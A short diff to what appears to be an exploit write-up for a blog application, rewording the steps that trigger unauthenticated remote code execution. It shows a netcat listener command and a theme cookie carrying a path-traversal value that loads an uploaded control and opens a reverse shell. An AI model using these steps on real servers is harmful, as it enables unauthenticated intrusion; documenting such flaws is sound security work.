@@ -115,13 +115,7 @@ Content-Disposition: form-data; filename="PostView.ascx"
 -----------------------------12143974373743678091868871063--
 ~~~
 
-The exploit can be triggered by opening a `netcat` listener:
-
-~~~{command="nc -nlvp $LPORT"}
-listening on [any] $LPORT ...
-~~~
-
-Browsing to the application with the **theme** cookie set to `../../App_Data/files/2019/06/`, no authentication required, triggers the Code Execution and opens a reverse shell:
+Open a  netcat listener, `nc -nlvp $LPORT`, and browse the application with the **theme** cookie set as `../../App_Data/files/2019/06/`, no authentication required.  The Code Execution triggers and opens a reverse shell:
 
 ~~~
 GET / HTTP/1.1
